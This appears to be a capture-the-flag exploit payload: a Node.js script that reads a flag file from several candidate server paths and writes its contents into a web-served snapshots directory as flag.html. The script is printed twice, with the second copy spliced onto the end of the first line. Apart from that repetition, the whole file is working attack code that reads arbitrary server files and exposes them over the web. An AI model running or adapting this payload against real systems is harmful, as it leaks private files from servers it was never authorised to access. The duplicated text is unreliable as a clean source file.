// payload.js
const fs = require("fs");
const path = require("path");

function readFlag() {
  const candidates = [
    "/flag.txt",
    "/opt/chal/flag.txt",
    path.join(process.cwd(), "flag.txt"),
    "flag.txt",
  ];
  for (const p of candidates) {
    try { return fs.readFileSync(p, "utf8"); } catch {}
  }
  return "FLAG NOT FOUND";
}

const flag = readFlag();

// __dirname will be the snapshots/ directory because the file is required from there
fs.writeFileSync(path.join(__dirname, "flag.html"), `<pre>${flag}</pre>`);// payload.js
const fs = require("fs");
const path = require("path");

function readFlag() {
  const candidates = [
    "/flag.txt",
    "/opt/chal/flag.txt",
    path.join(process.cwd(), "flag.txt"),
    "flag.txt",
  ];
  for (const p of candidates) {
    try { return fs.readFileSync(p, "utf8"); } catch {}
  }
  return "FLAG NOT FOUND";
}

const flag = readFlag();

// __dirname will be the snapshots/ directory because the file is required from there
fs.writeFileSync(path.join(__dirname, "flag.html"), `<pre>${flag}</pre>`);
